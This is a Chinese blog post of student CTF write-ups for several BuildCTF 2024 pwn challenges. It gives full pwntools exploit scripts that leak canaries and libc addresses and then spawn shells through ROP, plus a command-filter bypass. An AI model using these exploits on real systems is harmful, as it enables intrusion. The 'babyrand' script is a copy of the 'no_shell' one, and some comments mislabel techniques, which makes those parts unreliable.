---
layout: post
title: "build ctf pwn方向部分wp"
date:   2024-10-27
tags: [pwn]
comments: true
author: VR2050
toc: true
---
# buildctf

本次比赛为新生赛,比较菜,做出来的题不多(bushi)

就当作做题笔记了哈哈哈

## 我要成为shaweima传奇

checksec检查:

![1730029793847](/images/2024/2024-10-27-pwn-wp/1730029793847.png)

开的保护不多,运行看看

![1730029856439](/images/2024/2024-10-27-pwn-wp/1730029856439.png)

一看有中文,撕,有点不妙,想起来之前长城杯因为中文原因,ida解析不了中文看不懂题做不出来的悲剧了(悲)

大概看做了一个选项,可能哪几个选项存在漏洞

ida解析:

![1730030130540](/images/2024/2024-10-27-pwn-wp/1730030130540.png)

这个中文解析问题可以在网上搜一艘教程

一个是buy函数,还有一个是

![1730030194132](/images/2024/2024-10-27-pwn-wp/1730030194132.png)

![1730030251327](/images/2024/2024-10-27-pwn-wp/1730030251327.png)

先购买shaweima,如果shaweima数量>99就能拿到shell

主要看buy,虽然他说数量不能为负数,但是他还是执行了-=操作

所以直接nc连就行先买个-100个,让money多一些,再买

在全部吃掉,就拿到shell了

![1730030657574](/images/2024/2024-10-27-pwn-wp/1730030657574.png)

## touch heart

checksec检查

![1730030757563](/images/2024/2024-10-27-pwn-wp/1730030757563.png)

运行

![1730030812381](/images/2024/2024-10-27-pwn-wp/1730030812381.png)

ida反编译看看:

![1730030908511](/images/2024/2024-10-27-pwn-wp/1730030908511.png)

诶?还有过滤,正则绕过直接

![1730030964703](/images/2024/2024-10-27-pwn-wp/1730030964703.png)

nc连 ca\t fla\g

![1730031084750](/images/2024/2024-10-27-pwn-wp/1730031084750.png)

## unint

checksec 检查:

![1730031288065](/images/2024/2024-10-27-pwn-wp/1730031288065.png)

32位,开了cannary保护

![1730031358249](/images/2024/2024-10-27-pwn-wp/1730031358249.png)

运行如上

gdb加ida看看:

![1730032182178](/images/2024/2024-10-27-pwn-wp/1730032182178.png)

重点看那个get_n函数

![1730032234791](/images/2024/2024-10-27-pwn-wp/1730032234791.png)

存在整数溢出(问ai嘻嘻)

还有这个gift函数

![1730032372874](/images/2024/2024-10-27-pwn-wp/1730032372874.png)

格式化字符串泄露cannary

第一个getn决定输入字符的长度(修改v2的长度)

第二个是实现payload

大概思路就是先泄漏cannary地址以及libc地址计算libc基值

第二次rop拿shell

exp:

```python
# 导入pwntools库中的所有内容（假设Pwnmodules是pwntools的别名或封装）  
from Pwnmodules import *  
  
# 设置pwntools的上下文环境，包括日志级别、目标架构和操作系统  
context(log_level='debug', arch='i386', os='linux')  
  
# 创建一个远程目标对象，指定IP地址和端口号  
target = Target("27.25.151.80", 41451)  
  
# 加载本地ELF二进制文件（可能是目标程序的副本）  
elf = ELF("/root/Pwn/unint/./unint")  
  
# 加载本地libc库文件（与目标系统上的libc版本匹配）  
libc = ELF("/root/Pwn/unint/./libc-2.23.so")  
  
# 与远程目标进行交互，发送数据并接收响应  
# 这里假设远程服务会询问要读取的字节数  
target.ru("How many bytes do you want me to read? ")  
  
# 发送-1作为字节数，可能是为了触发某种错误或漏洞行为  
target.sl(b'-1')  
  
# 发送格式化字符串攻击载荷，尝试泄露栈上的信息  
# %7$p是一个格式化字符串指令，用于打印栈上第七个参数的值（以指针形式）  
target.sla("Ok, sounds good. What's your name?\n", b'%7$p')  
  
# 接收远程目标的响应，这里假设它会打印出“Your name is:”后跟泄露的地址  
target.ru("Your name is:")  
  
# 接收并解析泄露的栈地址（转换为十六进制整数）  
# 注意：这里假设泄露的地址后面跟着"00"，这可能是因为栈上的字符串以空字符结尾  
cannary = int(target.ru("00"), 16)  
  
# 定义一些关键的地址，包括puts函数的PLT、GOT入口和main函数的地址  
puts_plt = 0x80484a0  
puts_got = 0x0804a01c  
main = 0x80487c8  
  
# 打印泄露的栈地址  
print(hex(cannary))  
  
# 构造第一个攻击载荷  
# 这个载荷包括一些填充（'a'*0x20），栈地址（cannary），三个1（可能是为了绕过某些检查），  
# puts函数的PLT地址，main函数的地址，以及puts函数的GOT地址  
payload = b'a'*0x20 + p32(cannary) + p32(1)*3 + p32(puts_plt) + p32(main) + p32(puts_got)  
  
# 发送第一个攻击载荷  
target.sla("me what you got!\n", payload)  
  
# 接收远程目标返回的数据（应该是puts函数的地址）  
target.rl()  
puts_addr = u32(target.r(4))  
  
# 打印puts函数的地址  
print(hex(puts_addr))  
  
# 计算libc库的基地址  
libc_base = puts_addr - libc.sym['puts']  
  
# 计算system函数的地址和/bin/sh字符串的地址  
system_addr = libc_base + libc.sym["system"]  
str_bin_sh = libc_base + next(libc.search("/bin/sh\x00"))  
  
# 重复前面的步骤，准备发送第二个攻击载荷  
target.ru("How many bytes do you want me to read? ")  
target.sl(b'-1')  
target.sla("Ok, sounds good. What's your name?\n", b'%7$p')  
  
# 构造第二个攻击载荷  
# 这个载荷包括填充、栈地址、三个1、system函数的地址、1（可能是作为system函数的参数count），以及/bin/sh字符串的地址  
payload_2 = b'a'*0x20 + p32(cannary) + p32(1)*3 + p32(system_addr) + p32(1) + p32(str_bin_sh)  
  
# 发送第二个攻击载荷  
target.sla("me what you got!\n", payload_2)  
  
# 尝试获取远程目标的交互式shell  
target.inter()  

```

注释拿ai写的(个人懒得写bushi)

![1730032758607](/images/2024/2024-10-27-pwn-wp/1730032758607.png)

## retret

checksec检查

![1730033109617](/images/2024/2024-10-27-pwn-wp/1730033109617.png)

运行

![1730033161550](/images/2024/2024-10-27-pwn-wp/1730033161550.png)

ida

![1730033932063](/images/2024/2024-10-27-pwn-wp/1730033932063.png)

刚开始看没啥思路,能溢出的字节数太少(打印出泄漏)

![1730033969196](/images/2024/2024-10-27-pwn-wp/1730033969196.png)

gdb动态调试才明白

是个栈迁移:

![1730034664999](/images/2024/2024-10-27-pwn-wp/1730034664999.png)

后边再执行一次leave ret

对栈迁移了解的不太深,可以看看这位[师傅的文章](https://blog.csdn.net/weixin_39529207/article/details/123005057?fromshare=blogdetail&sharetype=blogdetail&sharerId=123005057&sharerefer=PC&sharesource=qq_72825267&sharefrom=from_link)

大致思路:

一共两次read,先迁移到buf的地址泄漏libc,然后计算基值,rop,bufde地址已经打印出来了,直接接收,这道题对我这样的新手真的很友好哈哈哈

第一次read写入payload,第二个写入buf的地址将函数劫持到buf上,循环两次,其中buf的地址会有变化,需要重新接收

exp:,

```python
from pwn import *  
  
# 设置上下文  
context(log_level='debug', arch='amd64', os='linux')  
  
# 目标二进制文件和 libc 文件路径  
binary_path = "/root/Pwn/retret/./pwn"  
libc_path = "/root/Pwn/retret/libc.so.6"  
  
# 加载 ELF 文件  
elf = ELF(binary_path)  
libc = ELF(libc_path)  
  
# 获取目标地址  
puts_plt = 0x401070
puts_got = 0x404018
vuln_addr = 0x4012dd  # 假设这是漏洞地址，具体需要根据实际情况确定  
  
# 查找 ROP gadgets  
pop_rdi = 0x40119e  # 需要根据二进制文件实际内容确定  
ret_addr = 0x40101a  # 查找返回地址的 gadget  
  
# 构造 payload 以泄露 puts 地址  
payload_leak = b'a' * 8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) +p64(ret_addr)+p64(0x4010b0)
  
# 启动目标程序  
# target = process("/root/Pwn/retret/./pwn")  # 如果是本地文件，可以使用 process(binary_path)  
# print(proc.pidof(target))
target=remote("27.25.151.80",35703)
# 发送 payload 并接收泄露的 puts 地址  
target.recvuntil(b"who are you?")  
target.sendline(payload_leak)  
target.recvuntil(b"card number ")  
  
buf_start1=int(target.recvline()[:-1],16)

print(f"buff_start1: {hex(buf_start1)}")



target.sendafter("Have a good time!\n",b'a'*8+p64(buf_start1))


# 解析泄露的 puts 地址  
# 计算 libc 基地址和 system、/bin/sh 的地址  

puts_addr=u64(target.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) 
log.info(f"puts_addr: {hex(puts_addr)}")  
libc_base = puts_addr - libc.sym['puts']  
system_addr = libc.sym['system'] + libc_base  
str_bin_sh = next(libc.search(b'/bin/sh\x00')) + libc_base  

print("%"*8)
print(f'system_addr: {hex(system_addr)}')
print(f'str_bin_sh_addr: {hex(str_bin_sh)}')
print("%"*8)
  
  
main_addr=0x4012b1
# 构造最终的 payload 以执行 system("/bin/sh")  
# pause()
execve=[0xebc81,0xebc85,0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43]
payload_exec = b'a' * 8 +p64(ret_addr)+ p64(pop_rdi) + p64(str_bin_sh) + p64(system_addr)
# payload_exec=b'a'*8+p64(execve[6]+libc_base)
# 发送最终的 payload 并交互  
target.recvuntil(b"who are you?\n")  

target.sendline(payload_exec)  
# pause()
target.recvuntil(b"card number ")  
buf_start2=int(target.recvline()[:-1],16)
print(f"buf_start2: {hex(buf_start2)}")
payload_3=b'a'*8+p64(buf_start2)  
target.sendafter("Have a good time!\n",payload_3)  
# pause()
target.interactive()
```

![1730036053529](/images/2024/2024-10-27-pwn-wp/1730036053529.png)

## real_random

这个题好玩,嘻嘻

checksec检查

![1730036490096](/images/2024/2024-10-27-pwn-wp/1730036490096.png)

开了不少保护还,这道题的确跟随机数有关,不过....

ida查看:

![1730036574693](/images/2024/2024-10-27-pwn-wp/1730036574693.png)

他的随机数长这样

![1730036641781](/images/2024/2024-10-27-pwn-wp/1730036641781.png)

哈哈哈

不过看看main函数的那个strcmp,这个函数可以绕过

大概思路:输入buf,头一位用来爆破,后边七位用\x00补全(有段时间没看cannary爆破了,抽时间看看)

```python
# 假设Pwnmodules是一个自定义模块，它封装了pwntools的功能，或者是pwntools的一个别名  
from Pwnmodules import *  
import ctypes  
  
# 创建一个远程目标对象，指定IP地址和端口号  
target = Target("27.25.151.80", 33613)  
  
# 设置pwntools的上下文环境，指定日志级别和架构  
context(log_level='debug', arch='amd64')  
  
# 向远程服务发送数据，尝试触发漏洞（可能是格式化字符串漏洞）  
# 这里发送了一个字节0和7个空字节（\x00），可能是为了绕过某些输入验证或填充  
target.sla("please input your text: ", bytes([0]) + b'\x00' * 7)  
  
# 尝试通过遍历0到0xff的字节值来找到能够触发特定响应的输入  
# 这种技术通常用于格式化字符串漏洞的利用中，以泄露内存信息  
for i in range(0xff):  
    try:  
        # 发送数据并等待响应，这里假设服务会返回一个特定的错误消息  
        target.ru("No,guess again!!!")  
        # 再次发送数据，这次是用遍历到的字节值替换第一个字节  
        target.sla("please input your text: ", bytes([i]) + b'\x00' * 7)  
        # 如果到这里没有抛出异常，则继续下一次循环  
        continue  
    except:  
        # 如果捕获到异常（可能是由于服务崩溃、连接断开等），则尝试获取交互式shell  
        # 但这里有一个逻辑问题：一旦进入except块，就会立即尝试获取shell，然后退出循环  
        # 这可能并不是您想要的行为，因为您可能想要记录哪个字节值触发了异常  
        target.inter()  
        # 注意：一旦进入except块并执行了target.inter()，下面的target.inter()将不会被执行  
  
# 下面的target.inter()在上面的循环中如果触发了异常则不会被执行  
# 如果循环正常结束（即没有触发异常），则这里的target.inter()将是唯一尝试获取shell的机会   
target.inter()
```

需要多跑一跑

说实话我很喜欢爆破题,可惜能力不够,只会做一两道,这个exp写的比较拉跨,多跑几次倒是能跑通,还是菜

## no_shell

checksec

![1730037714380](/images/2024/2024-10-27-pwn-wp/1730037714380.png)

ida查看

main函数

```cpp
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  printf("this is gift:%p\n", &printf);
  write(1, "simple!!! right?\n", 0x10uLL);
  vul();
  badfunction();
  return 0;
}
```

vul函数

```cpp
ssize_t vul()
{
  char buf[128]; // [rsp+0h] [rbp-80h] BYREF

  read(0, info, 0xEuLL);
  return read(0, buf, 0x200uLL);
}
```

badfunction

```cpp
int badfunction()

{
  unsigned int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i <= 0xD; ++i )
  {
    if ( info[i] == 'c' && info[i + 1] == 'a' && info[i + 2] == 't' )
    {
      puts("NO!!!, you won't get it!!!");
      exit(0);
    }
    if ( info[i] == 'b' || info[i] == 's' || info[i] == '/' || info[i] == 'i' || info[i] == 'n' || info[i] == '$' )
    {
      puts("almost there, but not yet");
      exit(0);
    }
  }
  puts("bye~");
  return close(1);
}
```

有个检查,不过没多大用,还是retlibc的思路,他那个检查,检查的是info里是否有/bin/sh或者cat字符串.可以不用那个地址,找libc里的字符串

libc文件有,printf的函数地址刚开始就泄露出来,可以计算libc基值,poprdi虽然没有找到,但是也可以通过libc基值计算出来

exp如下:

```python
from Pwnmodules import *  # pwnttols封装
context(log_level='debug', arch='amd64', os='linux')  # 设置pwntools的上下文环境  
  
target = Target("27.25.151.80", 34094)  # 设置远程目标  
  
elf = ELF("/root/Pwn/no_shell/./no_shell")  # 加载本地易受攻击的二进制文件  
libc = ELF("/root/Pwn/no_shell/libc.so.6")  # 加载本地libc库文件  
  
target.ru("this is gift:")  # 发送数据到远程服务并等待特定响应  
printf_addr = int(target.rl()[:-1], 16)  # 从远程服务的响应中读取printf函数的地址  
  
print(hex(printf_addr))  # 打印读取到的printf函数地址  
  
libc_base = printf_addr - libc.sym['printf']  # 计算libc库的基地址  
system_addr = libc_base + libc.sym["system"]  # 计算system函数的地址  
pop_rdi = 0x000000000002a3e5 + libc_base  # 计算pop rdi; ret gadget的地址  
str_bin_sh_addr = libc_base + next(libc.search("/bin/sh\x00"))  # 计算"/bin/sh"字符串的地址  
  
# 下面的execve_addr和gadget变量被注释掉了，因为它们可能不是必需的，或者需要针对特定的libc版本进行调整  
# execve_addr = [0xebc81, 0xebc85, 0xebc88, 0xebce2, 0xebd38, 0xebd3f, 0xebd43]  
# gadget = execve_addr[0] + libc_base  
  
# 发送一些无关紧要的数据，可能是为了触发漏洞或保持连接  
target.sl(b'eeeee')  
  
# 构造并发送攻击载荷  
# 注意：这里的0x40101a可能是一个栈上的返回地址，但它需要根据实际的二进制文件进行分析来确定  
# 如果这个地址不正确，攻击可能会失败  
payload = b'e' * 0x88 + p64(0x40101a) + p64(pop_rdi) + p64(str_bin_sh_addr) + p64(system_addr)  
target.sl(payload)  
  
# 尝试获取交互式shell  
target.inter()
```

## babyrand

checksec:

```shell
[*] '/root/Pwn/babyrand/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

```

有cannary保护,还有pie

运行:

![1730080793566](/images/2024/2024-10-27-pwn-wp/1730080793566.png)

ida查看:

```cpp

int __fastcall main(int argc, const char **argv, const char **envp)
{
  char v4[32]; // [rsp+0h] [rbp-60h] BYREF
  char buf[56]; // [rsp+20h] [rbp-40h] BYREF
  unsigned __int64 v6; // [rsp+58h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init(argc, argv, envp);
  login();
  puts("Login successful!");
  puts("Please enter your content!");
  read(0, buf, 0x30uLL);
  printf(buf);
  printf("Here's a little present for you %p \n", &puts);
  read(0, v4, 0x100uLL);
  return 0;
}
//login 函数
__int64 login()
{
  int i; // [rsp+8h] [rbp-138h]
  int j; // [rsp+8h] [rbp-138h]
  unsigned int seed; // [rsp+Ch] [rbp-134h]
  char v4[32]; // [rsp+10h] [rbp-130h]
  char buf[264]; // [rsp+30h] [rbp-110h] BYREF
  unsigned __int64 v6; // [rsp+138h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  seed = time(0LL);
  srand(seed);
  alarm(0x3Cu);
  puts("Welcome to BuildCTF2024 !\n");
  for ( i = 0; i <= 10; ++i )
    v4[i] = rand() % 25 + 32;
  puts("please login >>>>");
  read(0, buf, 0xFFuLL);
  for ( j = 0; j <= 10; ++j )
  {
    if ( buf[j] != v4[j] )
    {
      printf("Sorry, %sis not correct password.\n", buf);
      puts("Login failed!");
      exit(0);
    }
  }
  return 1LL;
}
```

简单的随机数

exp如下:

```python
from Pwnmodules import *  # pwnttols封装
context(log_level='debug', arch='amd64', os='linux')  # 设置pwntools的上下文环境  
  
target = Target("27.25.151.80", 34094)  # 设置远程目标  
  
elf = ELF("/root/Pwn/no_shell/./no_shell")  # 加载本地易受攻击的二进制文件  
libc = ELF("/root/Pwn/no_shell/libc.so.6")  # 加载本地libc库文件  
  
target.ru("this is gift:")  # 发送数据到远程服务并等待特定响应  
printf_addr = int(target.rl()[:-1], 16)  # 从远程服务的响应中读取printf函数的地址  
  
print(hex(printf_addr))  # 打印读取到的printf函数地址  
  
libc_base = printf_addr - libc.sym['printf']  # 计算libc库的基地址  
system_addr = libc_base + libc.sym["system"]  # 计算system函数的地址  
pop_rdi = 0x000000000002a3e5 + libc_base  # 计算pop rdi; ret gadget的地址  
str_bin_sh_addr = libc_base + next(libc.search("/bin/sh\x00"))  # 计算"/bin/sh"字符串的地址  
  
# 下面的execve_addr和gadget变量被注释掉了，因为它们可能不是必需的，或者需要针对特定的libc版本进行调整  
# execve_addr = [0xebc81, 0xebc85, 0xebc88, 0xebce2, 0xebd38, 0xebd3f, 0xebd43]  
# gadget = execve_addr[0] + libc_base  
  
# 发送一些无关紧要的数据，可能是为了触发漏洞或保持连接  
target.sl(b'eeeee')  
  
# 构造并发送攻击载荷  
# 注意：这里的0x40101a可能是一个栈上的返回地址，但它需要根据实际的二进制文件进行分析来确定  
# 如果这个地址不正确，攻击可能会失败  
payload = b'e' * 0x88 + p64(0x40101a) + p64(pop_rdi) + p64(str_bin_sh_addr) + p64(system_addr)  
target.sl(payload)  
  
# 尝试获取交互式shell  
target.inter()
```

## fmt1

checksec 检查:

```bash
[*] '/root/Pwn/test/test'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

```

运行:

```bash
Welcome to BuildCTF
What's this? => 0x7f770bc89450
kali
Are you sure this is kali?
kali
OK, Have a good day~看
```

看着像是格式化字符串漏洞

ida反编译代码如下:

```cpp
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char format[32]; // [rsp+0h] [rbp-50h] BYREF
  char v5[40]; // [rsp+20h] [rbp-30h] BYREF
  unsigned __int64 v6; // [rsp+48h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  puts("Welcome to BuildCTF");
  printf("What's this? => %p\n", &puts);
  __isoc99_scanf("%s", format);
  printf("Are you sure this is ");
  printf(format);
  puts("?");
  __isoc99_scanf("%s", v5);
  puts("OK, Have a good day~");
  return 0;
}
```

看上去没那么唬人,虽然开了很多保护,但是能泄露libc,pie保护基本没用,cannary也能泄露

exp如下:

```python
from Pwnmodules import *  # 对pwntools写的封装
  
# 设置上下文环境，包括日志等级、目标架构和操作系统  
context(log_level='debug', arch='amd64', os='linux')  
  
# 远程目标设置，这里假设目标IP为27.25.151.80，端口为41109  
# target=Target("/root/Pwn/test/test")  # 本地测试时使用的目标  
target=Target("27.25.151.80", 41109)  
  
# 加载本地ELF文件和libc库文件，用于符号解析和地址计算  
elf=ELF("/root/Pwn/test/./test")  
libc=ELF("/root/Pwn/test/libc-2.31.so")  
  
# 发送输入直到遇到" => "提示，然后读取并解析puts函数的地址  
target.ru(" => ")  
puts_addr=int(target.rl()[:-1], 16)  
print(hex(puts_addr))  
  
# 计算libc基地址，通过puts函数地址减去libc中puts符号的地址  
libc_base=puts_addr-libc.sym["puts"]  
  
# 查找并利用libc中的gadgets（如pop rdi指令）  
pop_rdi=0x1343+libc_base  # 一个pop rdi; ret指令的地址，用于设置第一个参数  
ret_addr=libc_base+0x000000000000101a  # 一个ret指令的地址，用于跳转到pop rdi  
system_addr=libc.sym["system"]+libc_base  # system函数的地址  
str_bin_sh_addr=libc_base+next(libc.search('/bin/sh\x00'))  # "/bin/sh"字符串的地址  
  
# 打印关键地址信息  
print(f"system: {hex(system_addr)}")  
print(f"puts: {hex(libc.sym['puts'])}")  
  
# 发送格式化字符串攻击载荷，读取栈上的cannary值（用于绕过栈保护）  
target.sl(b'%15$p')  
target.ru("Are you sure this is ")  
cannary=int(target.rl()[:-2], 16)  
print(hex(cannary))  
print("*"*5)  
print(hex(libc.sym["system"]))  
  
# 构造最终的攻击载荷  
# padding用于填充到目标地址，cannary用于绕过栈保护，ret_addr用于跳转到pop rdi，pop_rdi用于设置"/bin/sh"地址，system_addr用于执行system("/bin/sh")  
# 注意：这里的execve部分被注释掉了，可能是因为题目环境不允许直接使用execve，或者作者选择了另一种方法  
padding=0x28  # 填充字节数，根据目标程序的栈布局确定  
  
# payload=b'a'*padding+p64(cannary)+p64(ret_addr)+p64(pop_rdi)+p64(str_bin_sh_addr)+p64(system_addr)  # 使用system("/bin/sh")的payload  
execve=[0xe3b2e,0xe3b31,0xe3b34]  # 假设找到的execve gadget地址（直接执行/bin/sh的libc gadget）  
payload=b'a'*padding+p64(cannary)+p64(1)+p64(libc_base+execve[1])  # 使用execve gadget的payload  
  
# 发送攻击载荷，并等待获取shell  
target.sl(payload)  
target.rl()  # 可选：读取输出，确认攻击是否成功  
target.inter()  # 进入交互式shell
```

建议先本地调试调试

gdb -p pid,打断点

## 对你爱不完

这道题有意思

checksec检查:

```bash
[*] '/root/Pwn/对你爱不完/endless love'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
               
```

运行查看:

```bash
welcome build ctf

你决定打开日记本写下最后一笔
但密码是什么？
kali
bad bad
```

ida反编译:

```cpp
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s1[48]; // [rsp+0h] [rbp-E0h] BYREF
  char s[48]; // [rsp+30h] [rbp-B0h] BYREF
  char buf[128]; // [rsp+60h] [rbp-80h] BYREF

  strcpy(s1, "We passed the end, so we chase forever\n");
  initial(argc, argv);
  puts("你决定打开日记本写下最后一笔");
  puts("但密码是什么？");
  fgets(s, 40, stdin);
  if ( strcmp(s1, s) )
  {
    puts("bad bad");
    exit(0);
  }
  puts("看来你还记得我们的约定");
  puts("你可以继续写下去了");
  read(0, buf, 0x64uLL);
  change(buf, &output);
  memcpy(buf, &output, 0xF0uLL);
  return 0;
}
```

关键在于那个chage函数

```cpp
_BYTE *__fastcall change(__int64 a1, __int64 a2)
{
  int v2; // eax
  int v3; // eax
  _BYTE *result; // rax
  __int64 j; // [rsp+18h] [rbp-18h]
  unsigned __int64 i; // [rsp+20h] [rbp-10h]
  int v7; // [rsp+28h] [rbp-8h]
  int v8; // [rsp+2Ch] [rbp-4h]

  v8 = 0;
  v7 = 0;
  for ( i = 0LL; i <= 0xEF && v8 <= 239; ++i )
  {
    if ( *(a1 + i) == '@' && v7 <= 13 )
    {
      for ( j = 0LL; aLoveYou[j]; ++j )         // aLove:"love you"
      {
        v2 = v8++;
        *(v2 + a2) = aLoveYou[j];
      }
      ++v7;
    }
    else
    {
      v3 = v8++;
      *(a2 + v3) = *(a1 + i);
    }
  }
  result = (v8 + a2);
  *result = 0;
  return result;
}
```

将你输入的字符串进行一个替换,将"@",也就是0x40替换成love you,怎么样,气不起?辛辛苦苦构造的rop就被破坏了,哈哈哈,

当时给我气笑了,后来发现,他这个只替换了14次,你先输入14个@不就行了(当时没想到,真的太菜了bushi)

exp:

```python
from pwn import *
context(log_level='debug',arch='amd64',os='linux')
# target=Target("27.25.151.80",37819)
# target=process("/root/Pwn/对你爱不完/./endless love")
target=remote("27.25.151.80",37819)
target.sendlineafter("但密码是什么？\n",b'We passed the end, so we chase forever')
target.recvuntil("你可以继续写下去了\n")
libc=ELF("/root/Pwn/对你爱不完/./libc.so.6")
elf=ELF("/root/Pwn/对你爱不完/./endless love")
print(proc.pidof(target))

# pause()
out_put=0x4034a0
puts_plt=0x4010a0
puts_got=elf.got['puts']
pop_rdi=0x000000000040127d
padding=0x88
# shell=b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05a' # 0x18
# pause()
# shell=asm(shellcraft.sh()) # 0x30
# print(shell)
# print(len(shell))

# pause()
ret=0x000000000040101a
# payload_test=b'a'*0x48+b'@'*7+b'a'*8+p64(out_put) # 0x48+0x38+0x8+p64(output)
# payload_test=b'@'*14+shell+p64(0x403510) # 0x70+0x18ret_addr:out_put+0x70

payload_1=b'@'*14+b'a'*0x18+p64(ret)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(elf.sym['main']) # 14*8+0x18

pause()

target.send(payload_1)

pause()
puts_addr=u64(target.recv(6).ljust(8,b'\x00'))

print(hex(puts_addr))

libc_base=puts_addr-libc.sym['puts']
system_addr=libc.sym['system']+libc_base
str_bin_sh=next(libc.search("/bin/sh\x00"))+libc_base

target.sendlineafter("但密码是什么？\n",b'We passed the end, so we chase forever')

payload_2=b'@'*14+b'a'*0x18+p64(pop_rdi)+p64(str_bin_sh)+p64(system_addr)

target.sendafter("你可以继续写下去了\n",payload_2)

# pause()
target.interactive()



```

当时试了试retshellcode的思路,不行,好像有保护,嘻嘻

记得栈对齐(有的体要加个ret)

# 总结

没做出来多少,哎呀,这还是新生赛,哎呀,感觉新生赛越来越难了

官方发的wp需要i仔细研究研究,

我一直有个疑问,做这些题干啥,二进制安全不好实战呀,而且不好找工作,但是,我做出来题之后,总有一种开心的感觉

,可能这就是对自己的一种取悦或者自我安慰吧哈哈哈.
